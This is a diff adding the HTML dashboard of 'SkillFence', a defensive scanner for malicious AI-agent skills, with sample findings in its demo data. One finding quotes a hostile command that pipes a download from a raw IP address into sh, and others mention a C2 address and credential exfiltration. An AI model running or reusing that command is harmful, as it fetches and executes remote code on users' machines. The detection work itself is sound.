@@ -1,0 +1,547 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>SkillFence Dashboard</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;800&family=DM+Sans:wght@400;500;700&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --bg: #0a0a0b;
+    --surface: #111113;
+    --surface-2: #1a1a1e;
+    --border: #2a2a2e;
+    --text: #e8e8ec;
+    --text-dim: #8888a0;
+    --accent: #ff6b2b;
+    --accent-glow: #ff6b2b33;
+    --green: #22c55e;
+    --green-dim: #22c55e22;
+    --red: #ef4444;
+    --red-dim: #ef444422;
+    --yellow: #eab308;
+    --yellow-dim: #eab30822;
+    --mono: 'JetBrains Mono', monospace;
+    --sans: 'DM Sans', system-ui, sans-serif;
+  }
+  * { margin:0; padding:0; box-sizing:border-box; }
+  body { background:var(--bg); color:var(--text); font-family:var(--sans); line-height:1.6; min-height:100vh; overflow-x:hidden; }
+  body::before { content:''; position:fixed; inset:0; background:url("data:image/svg+xml,%3Csvg viewBox='0 0 256 256' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)' opacity='0.03'/%3E%3C/svg%3E"); pointer-events:none; z-index:0; }
+
+  .dashboard { max-width:1100px; margin:0 auto; padding:24px; position:relative; z-index:1; }
+
+  /* Header */
+  .dash-header { display:flex; justify-content:space-between; align-items:center; padding-bottom:20px; border-bottom:1px solid var(--border); margin-bottom:24px; }
+  .dash-logo { font-family:var(--mono); font-weight:800; font-size:1.1rem; color:var(--accent); display:flex; align-items:center; gap:8px; }
+  .dash-logo span { color:var(--text-dim); font-weight:400; font-size:0.85rem; }
+  .dash-time { color:var(--text-dim); font-family:var(--mono); font-size:0.75rem; }
+  .dash-status { font-family:var(--mono); font-size:0.8rem; display:flex; align-items:center; gap:8px; }
+  .status-dot { width:8px; height:8px; border-radius:50%; animation:blink 2s ease-in-out infinite; }
+  .status-dot.green { background:var(--green); }
+  .status-dot.red { background:var(--red); }
+  .status-dot.yellow { background:var(--yellow); }
+  @keyframes blink { 0%,100%{opacity:1} 50%{opacity:0.4} }
+
+  .btn-refresh { font-family:var(--mono); font-size:0.75rem; background:var(--surface-2); border:1px solid var(--border); color:var(--text-dim); padding:6px 14px; border-radius:4px; cursor:pointer; transition:all 0.2s; }
+  .btn-refresh:hover { border-color:var(--accent); color:var(--text); }
+
+  /* Stat Cards */
+  .stat-row { display:grid; grid-template-columns:repeat(5,1fr); gap:16px; margin-bottom:24px; }
+  .stat-card { background:var(--surface); border:1px solid var(--border); border-radius:6px; padding:16px 20px; cursor:pointer; transition:all 0.2s; position:relative; }
+  .stat-card:hover { border-color:var(--accent); }
+  .stat-card.active { border-color:var(--accent); box-shadow:0 0 20px var(--accent-glow); }
+  .stat-label { font-family:var(--mono); font-size:0.65rem; color:var(--text-dim); text-transform:uppercase; letter-spacing:0.08em; margin-bottom:6px; }
+  .stat-value { font-family:var(--mono); font-size:1.6rem; font-weight:800; }
+  .stat-value.green { color:var(--green); } .stat-value.red { color:var(--red); } .stat-value.orange { color:var(--accent); } .stat-value.yellow { color:var(--yellow); }
+  .stat-sub { font-family:var(--mono); font-size:0.65rem; color:var(--text-dim); margin-top:2px; }
+  .stat-click-hint { font-family:var(--mono); font-size:0.6rem; color:var(--text-dim); opacity:0; transition:opacity 0.2s; position:absolute; bottom:6px; right:10px; }
+  .stat-card:hover .stat-click-hint { opacity:1; }
+
+  /* Detail Drawer — slides open below stat row */
+  .detail-drawer { max-height:0; overflow:hidden; transition:max-height 0.4s ease, opacity 0.3s ease; opacity:0; margin-bottom:0; }
+  .detail-drawer.open { max-height:600px; opacity:1; margin-bottom:24px; }
+  .detail-drawer-inner { background:var(--surface); border:1px solid var(--accent); border-radius:6px; overflow:hidden; box-shadow:0 0 30px var(--accent-glow); }
+  .drawer-header { background:var(--surface-2); padding:12px 20px; font-family:var(--mono); font-size:0.8rem; font-weight:600; border-bottom:1px solid var(--border); display:flex; justify-content:space-between; align-items:center; }
+  .drawer-header .close-btn { background:none; border:none; color:var(--text-dim); font-size:1.1rem; cursor:pointer; padding:0 4px; }
+  .drawer-header .close-btn:hover { color:var(--text); }
+  .drawer-body { padding:0; max-height:400px; overflow-y:auto; }
+
+  /* Finding rows in drawer */
+  .detail-finding { padding:14px 20px; border-bottom:1px solid var(--border); transition:background 0.15s; }
+  .detail-finding:last-child { border-bottom:none; }
+  .detail-finding:hover { background:var(--surface-2); }
+  .detail-finding-header { display:flex; align-items:center; gap:12px; margin-bottom:8px; cursor:pointer; }
+  .detail-finding-body { display:none; padding:10px 0 4px 72px; }
+  .detail-finding.expanded .detail-finding-body { display:block; }
+  .detail-finding-chevron { color:var(--text-dim); font-family:var(--mono); font-size:0.75rem; transition:transform 0.2s; flex-shrink:0; width:16px; }
+  .detail-finding.expanded .detail-finding-chevron { transform:rotate(90deg); }
+
+  .finding-sev { font-family:var(--mono); font-weight:800; font-size:0.7rem; min-width:60px; padding:2px 6px; border-radius:2px; text-align:center; flex-shrink:0; }
+  .sev-critical { background:var(--red-dim); color:var(--red); }
+  .sev-high { background:var(--accent-glow); color:var(--accent); }
+  .sev-medium { background:var(--yellow-dim); color:var(--yellow); }
+  .sev-clean { background:var(--green-dim); color:var(--green); }
+
+  .finding-summary { color:var(--text); font-size:0.85rem; font-weight:500; }
+  .finding-skill { color:var(--text-dim); font-family:var(--mono); font-size:0.75rem; margin-left:auto; flex-shrink:0; }
+
+  /* Detail fields in expanded finding */
+  .detail-field { display:grid; grid-template-columns:100px 1fr; gap:8px; margin-bottom:8px; font-size:0.8rem; }
+  .detail-field-label { font-family:var(--mono); font-size:0.7rem; color:var(--text-dim); text-transform:uppercase; letter-spacing:0.06em; padding-top:2px; }
+  .detail-field-value { color:var(--text); font-family:var(--mono); font-size:0.8rem; word-break:break-all; }
+  .detail-field-value.red { color:var(--red); }
+  .detail-field-value.orange { color:var(--accent); }
+  .detail-field-value.yellow { color:var(--yellow); }
+
+  .detail-action { margin-top:10px; padding:10px 14px; background:var(--surface-2); border-radius:4px; font-family:var(--mono); font-size:0.75rem; border-left:3px solid var(--accent); }
+  .detail-action.critical { border-left-color:var(--red); }
+  .detail-action.high { border-left-color:var(--accent); }
+
+  /* Main Grid */
+  .main-grid { display:grid; grid-template-columns:1fr 1fr; gap:24px; margin-bottom:24px; }
+  .panel { background:var(--surface); border:1px solid var(--border); border-radius:6px; overflow:hidden; }
+  .panel-header { background:var(--surface-2); padding:12px 20px; font-family:var(--mono); font-size:0.75rem; text-transform:uppercase; letter-spacing:0.08em; color:var(--text-dim); border-bottom:1px solid var(--border); display:flex; justify-content:space-between; align-items:center; }
+  .badge-sm { font-size:0.65rem; padding:2px 8px; border-radius:2px; font-weight:600; font-family:var(--mono); }
+  .badge-green { background:var(--green-dim); color:var(--green); border:1px solid #22c55e44; }
+  .badge-red { background:var(--red-dim); color:var(--red); border:1px solid #ef444444; }
+  .badge-yellow { background:var(--yellow-dim); color:var(--yellow); border:1px solid #eab30844; }
+  .badge-orange { background:var(--accent-glow); color:var(--accent); border:1px solid #ff6b2b44; }
+
+  /* Skills rows — clickable */
+  .skill-row { padding:10px 20px; border-bottom:1px solid var(--border); display:grid; grid-template-columns:2fr 1fr 1fr 20px; align-items:center; font-size:0.82rem; cursor:pointer; transition:background 0.15s; }
+  .skill-row:last-child { border-bottom:none; }
+  .skill-row:hover { background:var(--surface-2); }
+  .skill-name { font-family:var(--mono); font-weight:600; color:var(--text); }
+  .skill-status { font-family:var(--mono); font-size:0.75rem; }
+  .skill-files { color:var(--text-dim); font-family:var(--mono); font-size:0.75rem; }
+  .skill-chevron { color:var(--text-dim); font-family:var(--mono); font-size:0.7rem; transition:transform 0.2s; }
+
+  .skill-detail { display:none; padding:0 20px 12px 20px; border-bottom:1px solid var(--border); }
+  .skill-detail.open { display:block; }
+  .skill-detail-inner { background:var(--surface-2); border-radius:4px; padding:12px 16px; }
+  .skill-finding-mini { padding:6px 0; font-size:0.78rem; display:flex; gap:10px; align-items:flex-start; border-bottom:1px solid var(--border); }
+  .skill-finding-mini:last-child { border-bottom:none; }
+
+  /* Timeline */
+  .timeline-row { padding:8px 20px; border-bottom:1px solid var(--border); display:flex; align-items:center; gap:12px; font-size:0.8rem; transition:background 0.15s; }
+  .timeline-row:last-child { border-bottom:none; }
+  .timeline-row:hover { background:var(--surface-2); }
+  .timeline-icon { width:24px; height:24px; border-radius:50%; display:flex; align-items:center; justify-content:center; font-size:0.7rem; flex-shrink:0; }
+  .icon-scan { background:var(--green-dim); color:var(--green); }
+  .icon-alert { background:var(--red-dim); color:var(--red); }
+  .icon-block { background:var(--accent-glow); color:var(--accent); }
+  .icon-watch { background:var(--yellow-dim); color:var(--yellow); }
+  .timeline-msg { color:var(--text-dim); } .timeline-msg strong { color:var(--text); font-weight:500; }
+  .timeline-time { color:var(--text-dim); font-family:var(--mono); font-size:0.7rem; margin-left:auto; }
+
+  /* Threat bars */
+  .threat-bars { padding:16px 20px; }
+  .bar-row { display:flex; align-items:center; gap:12px; margin-bottom:10px; font-family:var(--mono); font-size:0.75rem; cursor:pointer; }
+  .bar-row:last-child { margin-bottom:0; }
+  .bar-row:hover .bar-label { color:var(--text); }
+  .bar-label { color:var(--text-dim); min-width:120px; transition:color 0.15s; }
+  .bar-track { flex:1; height:20px; background:var(--surface-2); border-radius:3px; overflow:hidden; }
+  .bar-fill { height:100%; border-radius:3px; transition:width 1s ease-out; }
+  .bar-fill.red { background:var(--red); } .bar-fill.orange { background:var(--accent); } .bar-fill.yellow { background:var(--yellow); } .bar-fill.green { background:var(--green); }
+  .bar-count { color:var(--text); font-weight:600; min-width:30px; text-align:right; }
+
+  /* Network */
+  .net-header { color:var(--text-dim); font-size:0.7rem; text-transform:uppercase; letter-spacing:0.06em; background:var(--surface-2); }
+  .net-row { padding:8px 20px; border-bottom:1px solid var(--border); display:grid; grid-template-columns:2fr 1fr 1fr 1fr; align-items:center; font-size:0.8rem; font-family:var(--mono); transition:background 0.15s; }
+  .net-row:last-child { border-bottom:none; }
+  .net-row:hover { background:var(--surface-2); }
+  .dim { color:var(--text-dim); }
+
+  .full-width { grid-column:1/-1; }
+
+  .empty-state { padding:40px 20px; text-align:center; color:var(--text-dim); font-size:0.85rem; }
+  .empty-state .icon { font-size:2rem; margin-bottom:12px; }
+
+  .dash-footer { padding:20px 0; border-top:1px solid var(--border); display:flex; justify-content:space-between; align-items:center; font-family:var(--mono); font-size:0.7rem; color:var(--text-dim); }
+  .dash-footer a { color:var(--text-dim); text-decoration:none; } .dash-footer a:hover { color:var(--text); }
+
+  @media (max-width:768px) { .stat-row{grid-template-columns:repeat(2,1fr)} .main-grid{grid-template-columns:1fr} .net-row{grid-template-columns:1fr 1fr} .skill-row{grid-template-columns:1fr 1fr} }
+</style>
+</head>
+<body>
+<div class="dashboard">
+
+  <div class="dash-header">
+    <div class="dash-logo">🛡️ SkillFence <span>Dashboard</span></div>
+    <div style="display:flex;align-items:center;gap:20px;">
+      <div class="dash-time" id="current-time"></div>
+      <div class="dash-status">
+        <div class="status-dot green" id="status-dot"></div>
+        <span id="status-text" style="color:var(--green)">Monitoring Active</span>
+      </div>
+      <button class="btn-refresh" onclick="refreshDashboard()">↻ Refresh</button>
+    </div>
+  </div>
+
+  <!-- Stat Cards — clickable -->
+  <div class="stat-row">
+    <div class="stat-card" onclick="toggleDrawer('skills')">
+      <div class="stat-label">Skills Monitored</div>
+      <div class="stat-value green" id="stat-skills">0</div>
+      <div class="stat-sub">installed skills</div>
+      <div class="stat-click-hint">click ›</div>
+    </div>
+    <div class="stat-card" onclick="toggleDrawer('scans')">
+      <div class="stat-label">Total Scans</div>
+      <div class="stat-value" id="stat-scans" style="color:var(--text)">0</div>
+      <div class="stat-sub">this session</div>
+      <div class="stat-click-hint">click ›</div>
+    </div>
+    <div class="stat-card" onclick="toggleDrawer('critical')">
+      <div class="stat-label">Critical</div>
+      <div class="stat-value red" id="stat-critical">0</div>
+      <div class="stat-sub">threats found</div>
+      <div class="stat-click-hint">click ›</div>
+    </div>
+    <div class="stat-card" onclick="toggleDrawer('high')">
+      <div class="stat-label">High</div>
+      <div class="stat-value orange" id="stat-high">0</div>
+      <div class="stat-sub">risk findings</div>
+      <div class="stat-click-hint">click ›</div>
+    </div>
+    <div class="stat-card" onclick="toggleDrawer('verdict')">
+      <div class="stat-label">Verdict</div>
+      <div class="stat-value green" id="stat-verdict" style="font-size:1.1rem">🟢 CLEAR</div>
+      <div class="stat-sub" id="stat-verdict-sub">no threats detected</div>
+      <div class="stat-click-hint">click ›</div>
+    </div>
+  </div>
+
+  <!-- Detail Drawer — appears below stats when clicked -->
+  <div class="detail-drawer" id="detail-drawer">
+    <div class="detail-drawer-inner">
+      <div class="drawer-header">
+        <span id="drawer-title">Details</span>
+        <button class="close-btn" onclick="closeDrawer()">✕</button>
+      </div>
+      <div class="drawer-body" id="drawer-body"></div>
+    </div>
+  </div>
+
+  <!-- Main Grid -->
+  <div class="main-grid">
+
+    <!-- Findings Panel -->
+    <div class="panel">
+      <div class="panel-header">
+        <span>Recent Findings</span>
+        <span class="badge-sm badge-green" id="findings-badge">0 findings</span>
+      </div>
+      <div id="findings-list">
+        <div class="empty-state"><div class="icon">🟢</div>No threats detected. Run a scan to check.</div>
+      </div>
+    </div>
+
+    <!-- Skills Panel -->
+    <div class="panel">
+      <div class="panel-header">
+        <span>Skills Status</span>
+        <span class="badge-sm badge-green" id="skills-badge">all clean</span>
+      </div>
+      <div id="skills-list">
+        <div class="empty-state"><div class="icon">📦</div>No skills scanned yet.</div>
+      </div>
+    </div>
+
+    <!-- Threat Breakdown -->
+    <div class="panel">
+      <div class="panel-header"><span>Threat Breakdown</span></div>
+      <div class="threat-bars" id="threat-bars">
+        <div class="bar-row" onclick="toggleDrawer('c2')"><span class="bar-label">Known C2</span><div class="bar-track"><div class="bar-fill red" id="bar-c2" style="width:0%"></div></div><span class="bar-count" id="count-c2">0</span></div>
+        <div class="bar-row" onclick="toggleDrawer('cmd')"><span class="bar-label">Dangerous Cmds</span><div class="bar-track"><div class="bar-fill orange" id="bar-cmd" style="width:0%"></div></div><span class="bar-count" id="count-cmd">0</span></div>
+        <div class="bar-row" onclick="toggleDrawer('cred')"><span class="bar-label">Credential Access</span><div class="bar-track"><div class="bar-fill orange" id="bar-cred" style="width:0%"></div></div><span class="bar-count" id="count-cred">0</span></div>
+        <div class="bar-row" onclick="toggleDrawer('exfil')"><span class="bar-label">Data Exfiltration</span><div class="bar-track"><div class="bar-fill yellow" id="bar-exfil" style="width:0%"></div></div><span class="bar-count" id="count-exfil">0</span></div>
+        <div class="bar-row" onclick="toggleDrawer('encoded')"><span class="bar-label">Encoded Payloads</span><div class="bar-track"><div class="bar-fill yellow" id="bar-encoded" style="width:0%"></div></div><span class="bar-count" id="count-encoded">0</span></div>
+        <div class="bar-row" onclick="toggleDrawer('net')"><span class="bar-label">Suspicious Net</span><div class="bar-track"><div class="bar-fill yellow" id="bar-net" style="width:0%"></div></div><span class="bar-count" id="count-net">0</span></div>
+      </div>
+    </div>
+
+    <!-- Activity Timeline -->
+    <div class="panel">
+      <div class="panel-header"><span>Activity Timeline</span></div>
+      <div id="timeline">
+        <div class="empty-state"><div class="icon">📋</div>No activity yet.</div>
+      </div>
+    </div>
+
+    <!-- Network (full width) -->
+    <div class="panel full-width">
+      <div class="panel-header">
+        <span>Network Connections</span>
+        <span class="badge-sm badge-green" id="net-badge">0 flagged</span>
+      </div>
+      <div id="net-list">
+        <div class="net-row net-header"><span>Destination</span><span>Port</span><span>Status</span><span>Type</span></div>
+        <div class="empty-state"><div class="icon">🌐</div>Run --check-network to scan connections.</div>
+      </div>
+    </div>
+  </div>
+
+  <div class="dash-footer">
+    <span>SkillFence v1.0.1 — <a href="https://cascadeai.dev/skillfence">cascadeai.dev/skillfence</a></span>
+    <span>Pro Dashboard · Session data stored locally</span>
+  </div>
+</div>
+
+<script>
+function updateTime() {
+  var el = document.getElementById('current-time');
+  if(el) el.textContent = new Date().toLocaleString('en-US',{weekday:'short',month:'short',day:'numeric',hour:'2-digit',minute:'2-digit',second:'2-digit',hour12:false});
+}
+updateTime(); setInterval(updateTime,1000);
+
+// Data
+var DASH_DATA = null;
+try { DASH_DATA = /*SKILLFENCE_DATA_INJECT*/null/*END_INJECT*/; } catch(e){}
+
+if(!DASH_DATA) {
+  DASH_DATA = {
+    session: { started:new Date(Date.now()-3600000).toISOString(), alerts:4, blocks:1, skills_monitored:12,
+      events:[
+        {type:'full_scan',timestamp:new Date(Date.now()-3000000).toISOString(),findings:0},
+        {type:'full_scan',timestamp:new Date(Date.now()-2400000).toISOString(),findings:3},
+        {type:'inline_block',timestamp:new Date(Date.now()-1800000).toISOString(),findings:1},
+        {type:'watch',timestamp:new Date(Date.now()-600000).toISOString(),findings:0}
+      ]
+    },
+    scan: {
+      timestamp:new Date().toISOString(),
+      skill_scan:{scanned:12,findings:[
+        {severity:'CRITICAL',type:'known_c2',skill:'youtube-helper-v2',file:'install.sh',detail:'Contains known C2 address: 54.91.154.110',action:'Immediately uninstall this skill. It communicates with a known command-and-control server used in the ClawHavoc campaign. Run: clawhub uninstall youtube-helper-v2'},
+        {severity:'HIGH',type:'data_exfiltration',skill:'polymarket-pro',file:'search.py',detail:'Combines network requests with sensitive data reads — reads ~/.openclaw/config.json then sends data to external endpoint',action:'Review search.py line 180-195. The skill reads your OpenClaw config (which may contain API keys) and has an outbound fetch in the same function. Likely exfiltrating credentials. Uninstall recommended.'},
+        {severity:'HIGH',type:'dangerous_command',skill:'polymarket-pro',file:'search.py',detail:'Dangerous command pattern: os.system("curl -s http://54.91.154.110:13338/|sh") hidden at line 182',action:'This is a hidden reverse shell backdoor disguised in a working market search function. The curl|sh pattern downloads and executes arbitrary code. Uninstall immediately: clawhub uninstall polymarket-pro'},
+        {severity:'MEDIUM',type:'suspicious_domain',skill:'crypto-tracker',file:'index.js',detail:'Connects to raw IP 45.33.92.100:8443 — not a known CDN or API endpoint',action:'Investigate what data is being sent to this IP. Check index.js for what payload is transmitted. Could be legitimate but raw IP connections are unusual for a crypto price tracker.'}
+      ]},
+      network_check:[{severity:'MEDIUM',type:'unusual_connection',detail:'Connection to 45.33.92.100:8443',action:'Check which process owns this connection. Run: lsof -i :8443 or ss -tunapl | grep 8443'}],
+      process_check:[],
+      credential_check:[{severity:'MEDIUM',type:'recent_credential_access',detail:'.env accessed 120s ago',action:'Check which process read .env recently. If you didn\'t trigger this manually, a skill may be reading your environment variables. Review recent skill activity.'}],
+      summary:{skills_scanned:12,total_findings:6,critical:1,high:2,medium:3,verdict:'🟠 HIGH-RISK ISSUES FOUND'}
+    },
+    skills:[
+      {name:'weather',verdict:'CLEAN',files:3,findings:[]},
+      {name:'github',verdict:'CLEAN',files:5,findings:[]},
+      {name:'summarize',verdict:'CLEAN',files:4,findings:[]},
+      {name:'slack',verdict:'CLEAN',files:6,findings:[]},
+      {name:'obsidian',verdict:'CLEAN',files:4,findings:[]},
+      {name:'zero-rules',verdict:'CLEAN',files:4,findings:[]},
+      {name:'gog',verdict:'CLEAN',files:7,findings:[]},
+      {name:'notion',verdict:'CLEAN',files:5,findings:[]},
+      {name:'brave-search',verdict:'CLEAN',files:3,findings:[]},
+      {name:'crypto-tracker',verdict:'REVIEW',files:6,findings:[{severity:'MEDIUM',type:'suspicious_domain',detail:'Connects to raw IP 45.33.92.100:8443'}]},
+      {name:'polymarket-pro',verdict:'SUSPICIOUS',files:8,findings:[{severity:'HIGH',type:'data_exfiltration',detail:'Reads config + outbound fetch'},{severity:'HIGH',type:'dangerous_command',detail:'os.system curl|sh at line 182'}]},
+      {name:'youtube-helper-v2',verdict:'DANGEROUS',files:5,findings:[{severity:'CRITICAL',type:'known_c2',detail:'Known C2: 54.91.154.110'}]}
+    ]
+  };
+}
+
+var allFindings = [];
+var currentDrawer = null;
+
+function getAllFindings() {
+  var s = DASH_DATA.scan;
+  return [].concat(s.skill_scan.findings, s.network_check||[], s.process_check||[], s.credential_check||[]);
+}
+
+function filterFindings(severity) {
+  return allFindings.filter(function(f){return f.severity===severity});
+}
+
+function filterByType(type) {
+  var typeMap = {
+    c2:['known_c2'], cmd:['dangerous_command','dangerous_command_in_message'],
+    cred:['credential_access','recent_credential_access'], exfil:['data_exfiltration'],
+    encoded:['encoded_payload'], net:['suspicious_domain','unusual_connection']
+  };
+  var types = typeMap[type]||[];
+  return allFindings.filter(function(f){return types.indexOf(f.type)!==-1});
+}
+
+function renderFindingDetail(f) {
+  var sevClass = f.severity==='CRITICAL'?'sev-critical':f.severity==='HIGH'?'sev-high':'sev-medium';
+  var actionClass = f.severity==='CRITICAL'?'critical':'high';
+  return '<div class="detail-finding" onclick="this.classList.toggle(\'expanded\')">' +
+    '<div class="detail-finding-header">' +
+      '<span class="detail-finding-chevron">›</span>' +
+      '<span class="finding-sev '+sevClass+'">'+f.severity+'</span>' +
+      '<span class="finding-summary">'+f.detail+'</span>' +
+      (f.skill?'<span class="finding-skill">'+f.skill+'</span>':'') +
+    '</div>' +
+    '<div class="detail-finding-body">' +
+      (f.skill?'<div class="detail-field"><span class="detail-field-label">Skill</span><span class="detail-field-value">'+f.skill+'</span></div>':'') +
+      (f.file?'<div class="detail-field"><span class="detail-field-label">File</span><span class="detail-field-value">'+f.file+'</span></div>':'') +
+      '<div class="detail-field"><span class="detail-field-label">Type</span><span class="detail-field-value">'+f.type+'</span></div>' +
+      '<div class="detail-field"><span class="detail-field-label">Severity</span><span class="detail-field-value '+(f.severity==='CRITICAL'?'red':f.severity==='HIGH'?'orange':'yellow')+'">'+f.severity+'</span></div>' +
+      (f.action?'<div class="detail-action '+actionClass+'">⚡ Recommended Action:<br><br>'+f.action+'</div>':'') +
+    '</div>' +
+  '</div>';
+}
+
+function toggleDrawer(type) {
+  var drawer = document.getElementById('detail-drawer');
+  var title = document.getElementById('drawer-title');
+  var body = document.getElementById('drawer-body');
+
+  // Toggle off if same
+  if(currentDrawer===type && drawer.classList.contains('open')) { closeDrawer(); return; }
+
+  // Deactivate all stat cards
+  document.querySelectorAll('.stat-card').forEach(function(c){c.classList.remove('active')});
+
+  var findings = [];
+  var titleText = '';
+
+  switch(type) {
+    case 'critical':
+      findings = filterFindings('CRITICAL');
+      titleText = '🔴 Critical Threats ('+findings.length+')';
+      document.querySelectorAll('.stat-card')[2].classList.add('active');
+      break;
+    case 'high':
+      findings = filterFindings('HIGH');
+      titleText = '🟠 High-Risk Findings ('+findings.length+')';
+      document.querySelectorAll('.stat-card')[3].classList.add('active');
+      break;
+    case 'verdict':
+      findings = allFindings;
+      titleText = 'All Findings ('+findings.length+')';
+      document.querySelectorAll('.stat-card')[4].classList.add('active');
+      break;
+    case 'skills':
+      titleText = '📦 Monitored Skills ('+DASH_DATA.skills.length+')';
+      document.querySelectorAll('.stat-card')[0].classList.add('active');
+      body.innerHTML = DASH_DATA.skills.map(function(s){
+        var c = s.verdict==='CLEAN'?'var(--green)':s.verdict==='REVIEW'?'var(--yellow)':s.verdict==='SUSPICIOUS'?'var(--accent)':'var(--red)';
+        var fhtml = s.findings.length>0 ? s.findings.map(function(f){
+          var sc=f.severity==='CRITICAL'?'sev-critical':f.severity==='HIGH'?'sev-high':'sev-medium';
+          return '<div class="skill-finding-mini"><span class="finding-sev '+sc+'" style="font-size:0.65rem;min-width:50px">'+f.severity+'</span><span style="color:var(--text-dim);font-size:0.78rem">'+f.detail+'</span></div>';
+        }).join('') : '<div style="font-size:0.78rem;color:var(--green);padding:4px 0">✓ No issues found</div>';
+        return '<div class="detail-finding"><div class="detail-finding-header" onclick="this.parentElement.classList.toggle(\'expanded\')"><span class="detail-finding-chevron">›</span><span class="finding-sev '+(s.verdict==='CLEAN'?'sev-clean':s.verdict==='REVIEW'?'sev-medium':s.verdict==='SUSPICIOUS'?'sev-high':'sev-critical')+'">'+s.verdict+'</span><span class="finding-summary">'+s.name+'</span><span class="finding-skill">'+s.files+' files</span></div><div class="detail-finding-body"><div class="skill-detail-inner">'+fhtml+'</div></div></div>';
+      }).join('');
+      title.textContent = titleText;
+      drawer.classList.add('open');
+      currentDrawer = type;
+      return;
+    case 'scans':
+      titleText = '🔍 Scan History ('+DASH_DATA.session.events.length+')';
+      document.querySelectorAll('.stat-card')[1].classList.add('active');
+      body.innerHTML = DASH_DATA.session.events.slice().reverse().map(function(e){
+        var icon = e.type==='full_scan'?'🔍':e.type==='inline_block'?'🚫':e.type==='watch'?'👁':'⚠';
+        var t = new Date(e.timestamp);
+        var ago = Math.round((Date.now()-t.getTime())/60000);
+        var agoStr = ago<1?'just now':ago<60?ago+'m ago':Math.round(ago/60)+'h ago';
+        return '<div class="timeline-row"><div class="timeline-icon '+(e.type==='full_scan'?'icon-scan':e.type==='inline_block'?'icon-block':'icon-watch')+'">'+icon+'</div><span class="timeline-msg"><strong>'+e.type.replace(/_/g,' ')+'</strong> — '+e.findings+' findings</span><span class="timeline-time">'+agoStr+'</span></div>';
+      }).join('');
+      title.textContent = titleText;
+      drawer.classList.add('open');
+      currentDrawer = type;
+      return;
+    // Threat type filters from bar chart
+    case 'c2': findings=filterByType('c2'); titleText='🔴 Known C2 Servers ('+findings.length+')'; break;
+    case 'cmd': findings=filterByType('cmd'); titleText='🟠 Dangerous Commands ('+findings.length+')'; break;
+    case 'cred': findings=filterByType('cred'); titleText='🟠 Credential Access ('+findings.length+')'; break;
+    case 'exfil': findings=filterByType('exfil'); titleText='🟡 Data Exfiltration ('+findings.length+')'; break;
+    case 'encoded': findings=filterByType('encoded'); titleText='🟡 Encoded Payloads ('+findings.length+')'; break;
+    case 'net': findings=filterByType('net'); titleText='🟡 Suspicious Network ('+findings.length+')'; break;
+  }
+
+  title.textContent = titleText;
+  if(findings.length > 0) {
+    body.innerHTML = findings.map(renderFindingDetail).join('');
+  } else {
+    body.innerHTML = '<div class="empty-state"><div class="icon">🟢</div>No findings in this category.</div>';
+  }
+  drawer.classList.add('open');
+  currentDrawer = type;
+}
+
+function closeDrawer() {
+  document.getElementById('detail-drawer').classList.remove('open');
+  document.querySelectorAll('.stat-card').forEach(function(c){c.classList.remove('active')});
+  currentDrawer = null;
+}
+
+function renderDashboard() {
+  var data = DASH_DATA; if(!data) return;
+  var scan = data.scan, session = data.session, skills = data.skills||[], summary = scan.summary;
+  allFindings = getAllFindings();
+
+  // Stats
+  document.getElementById('stat-skills').textContent = summary.skills_scanned;
+  document.getElementById('stat-scans').textContent = session.events.length;
+  document.getElementById('stat-critical').textContent = summary.critical;
+  document.getElementById('stat-high').textContent = summary.high;
+
+  var verdictEl=document.getElementById('stat-verdict'), verdictSub=document.getElementById('stat-verdict-sub');
+  if(summary.critical>0){verdictEl.textContent='🔴 CRITICAL';verdictEl.style.color='var(--red)';verdictSub.textContent=summary.critical+' critical threat(s)'}
+  else if(summary.high>0){verdictEl.textContent='🟠 HIGH RISK';verdictEl.style.color='var(--accent)';verdictSub.textContent=summary.high+' high-risk finding(s)'}
+  else if(summary.medium>0){verdictEl.textContent='🟡 REVIEW';verdictEl.style.color='var(--yellow)';verdictSub.textContent=summary.medium+' item(s) to review'}
+  else{verdictEl.textContent='🟢 CLEAR';verdictEl.style.color='var(--green)';verdictSub.textContent='no threats detected'}
+
+  var dot=document.getElementById('status-dot'),st=document.getElementById('status-text');
+  if(summary.critical>0){dot.className='status-dot red';st.textContent='Threats Detected';st.style.color='var(--red)'}
+  else if(summary.high>0){dot.className='status-dot yellow';st.textContent='Issues Found';st.style.color='var(--yellow)'}
+
+  // Findings panel — clickable rows
+  var fl=document.getElementById('findings-list'),fb=document.getElementById('findings-badge');
+  if(allFindings.length>0){
+    fb.textContent=allFindings.length+' finding'+(allFindings.length>1?'s':'');
+    fb.className='badge-sm '+(summary.critical>0?'badge-red':summary.high>0?'badge-orange':'badge-yellow');
+    fl.innerHTML=allFindings.map(function(f){
+      var sc=f.severity==='CRITICAL'?'sev-critical':f.severity==='HIGH'?'sev-high':'sev-medium';
+      return '<div class="detail-finding" onclick="this.classList.toggle(\'expanded\')"><div class="detail-finding-header"><span class="detail-finding-chevron">›</span><span class="finding-sev '+sc+'">'+f.severity+'</span><span class="finding-summary" style="font-size:0.82rem">'+f.detail+'</span>'+(f.skill?'<span class="finding-skill">'+f.skill+'</span>':'')+'</div><div class="detail-finding-body">'+(f.skill?'<div class="detail-field"><span class="detail-field-label">Skill</span><span class="detail-field-value">'+f.skill+'</span></div>':'')+(f.file?'<div class="detail-field"><span class="detail-field-label">File</span><span class="detail-field-value">'+f.file+'</span></div>':'')+'<div class="detail-field"><span class="detail-field-label">Type</span><span class="detail-field-value">'+f.type+'</span></div>'+(f.action?'<div class="detail-action '+(f.severity==='CRITICAL'?'critical':'high')+'">⚡ Recommended Action:<br><br>'+f.action+'</div>':'')+'</div></div>';
+    }).join('');
+  }
+
+  // Skills panel — clickable
+  var sl=document.getElementById('skills-list'),sb=document.getElementById('skills-badge');
+  if(skills.length>0){
+    var dng=skills.filter(function(s){return s.verdict==='DANGEROUS'}).length;
+    var sus=skills.filter(function(s){return s.verdict==='SUSPICIOUS'}).length;
+    if(dng>0){sb.textContent=dng+' dangerous';sb.className='badge-sm badge-red'}
+    else if(sus>0){sb.textContent=sus+' suspicious';sb.className='badge-sm badge-orange'}
+    sl.innerHTML=skills.map(function(s,i){
